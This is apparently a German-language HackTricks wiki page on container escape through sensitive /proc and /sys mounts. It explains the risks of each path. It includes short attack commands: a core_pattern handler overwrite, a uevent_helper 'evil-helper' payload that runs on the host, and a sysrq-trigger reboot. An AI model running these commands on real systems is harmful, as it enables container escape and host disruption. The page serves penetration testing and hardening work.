# Sensible Mounts

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

Die Offenlegung von `/proc` und `/sys` ohne angemessene Namensraumisolierung bringt erhebliche Sicherheitsrisiken mit sich, einschließlich einer Vergrößerung der Angriffsfläche und der Offenlegung von Informationen. Diese Verzeichnisse enthalten sensible Dateien, die, wenn sie falsch konfiguriert oder von einem unbefugten Benutzer zugegriffen werden, zu einem Container-Ausbruch, Host-Modifikation oder zur Bereitstellung von Informationen führen können, die weitere Angriffe unterstützen. Beispielsweise kann das falsche Mounten von `-v /proc:/host/proc` den AppArmor-Schutz aufgrund seiner pfadbasierten Natur umgehen und `/host/proc` ungeschützt lassen.

**Weitere Details zu jeder potenziellen Schwachstelle finden Sie in** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## procfs Schwachstellen

### `/proc/sys`

Dieses Verzeichnis erlaubt den Zugriff zur Modifikation von Kernel-Variablen, normalerweise über `sysctl(2)`, und enthält mehrere besorgniserregende Unterverzeichnisse:

#### **`/proc/sys/kernel/core_pattern`**

* Beschrieben in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
* Ermöglicht die Definition eines Programms, das bei der Erstellung von Kernelspeicherabbilddateien ausgeführt wird, wobei die ersten 128 Bytes als Argumente verwendet werden. Dies kann zu einer Codeausführung führen, wenn die Datei mit einer Pipe `|` beginnt.
*   **Test- und Ausbeutungsbeispiel**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Testen des Schreibzugriffs
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Benutzerdefinierten Handler festlegen
sleep 5 && ./crash & # Handler auslösen
```

#### **`/proc/sys/kernel/modprobe`**

* Detailliert in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Enthält den Pfad zum Kernel-Modul-Lader, der zum Laden von Kernel-Modulen aufgerufen wird.
*   **Zugriffsüberprüfungsbeispiel**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Zugriff auf modprobe überprüfen
```

#### **`/proc/sys/vm/panic_on_oom`**

* Referenziert in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Ein globales Flag, das steuert, ob der Kernel einen Panic auslöst oder den OOM-Killer aufruft, wenn eine OOM-Bedingung auftritt.

#### **`/proc/sys/fs`**

* Laut [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) enthält es Optionen und Informationen über das Dateisystem.
* Schreibzugriff kann verschiedene Denial-of-Service-Angriffe gegen den Host ermöglichen.

#### **`/proc/sys/fs/binfmt_misc`**

* Ermöglicht die Registrierung von Interpretern für nicht-native Binärformate basierend auf ihrer Magischen Zahl.
* Kann zu einer Privilegieneskalation oder Root-Shell-Zugriff führen, wenn `/proc/sys/fs/binfmt_misc/register` beschreibbar ist.
* Relevante Ausnutzung und Erklärung:
* [Poor man's rootkit via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* Ausführliches Tutorial: [Video-Link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Weitere in `/proc`

#### **`/proc/config.gz`**

* Kann die Kernel-Konfiguration offenbaren, wenn `CONFIG_IKCONFIG_PROC` aktiviert ist.
* Nützlich für Angreifer, um Schwachstellen im laufenden Kernel zu identifizieren.

#### **`/proc/sysrq-trigger`**

* Ermöglicht das Auslösen von Sysrq-Befehlen, was möglicherweise sofortige Systemneustarts oder andere kritische Aktionen verursacht.
*   **Beispiel für Neustart des Hosts**:

```bash
echo b > /proc/sysrq-trigger # Neustart des Hosts
```

#### **`/proc/kmsg`**

* Gibt Nachrichten aus dem Kernel-Ringpuffer aus.
* Kann bei Kernel-Ausnutzungen, Adresslecks und der Bereitstellung sensibler Systeminformationen helfen.

#### **`/proc/kallsyms`**

* Listet vom Kernel exportierte Symbole und deren Adressen auf.
* Essentiell für die Entwicklung von Kernel-Ausnutzungen, insbesondere um KASLR zu überwinden.
* Adressinformationen sind eingeschränkt, wenn `kptr_restrict` auf `1` oder `2` gesetzt ist.
* Details in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

* Schnittstelle zum Kernel-Speichergerät `/dev/mem`.
* Historisch anfällig für Privilegieneskalationsangriffe.
* Mehr zu [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

* Stellt den physischen Speicher des Systems im ELF-Kernformat dar.
* Das Lesen kann Inhalte des Host-Systems und anderer Container offenbaren.
* Große Dateigröße kann zu Leseproblemen oder Softwareabstürzen führen.
* Detaillierte Nutzung in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

* Alternative Schnittstelle für `/dev/kmem`, die den virtuellen Speicher des Kernels darstellt.
* Ermöglicht das Lesen und Schreiben, somit die direkte Modifikation des Kernel-Speichers.

#### **`/proc/mem`**

* Alternative Schnittstelle für `/dev/mem`, die den physischen Speicher darstellt.
* Ermöglicht das Lesen und Schreiben, die Modifikation des gesamten Speichers erfordert die Auflösung virtueller zu physischen Adressen.

#### **`/proc/sched_debug`**

* Gibt Informationen zur Prozessplanung zurück und umgeht die PID-Namensraum-Schutzmaßnahmen.
* Gibt Prozessnamen, IDs und cgroup-Identifikatoren preis.

#### **`/proc/[pid]/mountinfo`**

* Bietet Informationen über Mount-Punkte im Namensraum des Prozesses.
* Gibt den Standort des Container `rootfs` oder Images preis.

### `/sys` Schwachstellen

#### **`/sys/kernel/uevent_helper`**

* Wird zur Handhabung von Kernel-Gerät `uevents` verwendet.
* Das Schreiben in `/sys/kernel/uevent_helper` kann beliebige Skripte bei `uevent`-Auslösungen ausführen.
*   **Beispiel für Ausnutzung**: %%%bash

#### Erstellt eine Payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Findet den Host-Pfad vom OverlayFS-Mount für den Container

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

#### Setzt uevent\_helper auf schädlichen Helper

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

#### Löst ein uevent aus

echo change > /sys/class/mem/null/uevent

#### Liest die Ausgabe

cat /output %%%

#### **`/sys/class/thermal`**

* Steuert Temperatureinstellungen, was möglicherweise DoS-Angriffe oder physische Schäden verursachen kann.

#### **`/sys/kernel/vmcoreinfo`**

* Leckt Kernel-Adressen, was möglicherweise KASLR gefährdet.

#### **`/sys/kernel/security`**

* Beherbergt die `securityfs`-Schnittstelle, die die Konfiguration von Linux-Sicherheitsmodulen wie AppArmor ermöglicht.
* Der Zugriff könnte es einem Container ermöglichen, sein MAC-System zu deaktivieren.

#### **`/sys/firmware/efi/vars` und `/sys/firmware/efi/efivars`**

* Gibt Schnittstellen für die Interaktion mit EFI-Variablen im NVRAM preis.
* Fehlkonfiguration oder Ausnutzung kann zu unbrauchbaren Laptops oder nicht bootfähigen Host-Maschinen führen.

#### **`/sys/kernel/debug`**

* `debugfs` bietet eine "keine Regeln"-Debugging-Schnittstelle zum Kernel.
* Geschichte von Sicherheitsproblemen aufgrund seiner uneingeschränkten Natur.

### Referenzen

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Verstehen und Härtung von Linux-Containern](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Missbrauch von privilegierten und unprivilegierten Linux-Containern](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
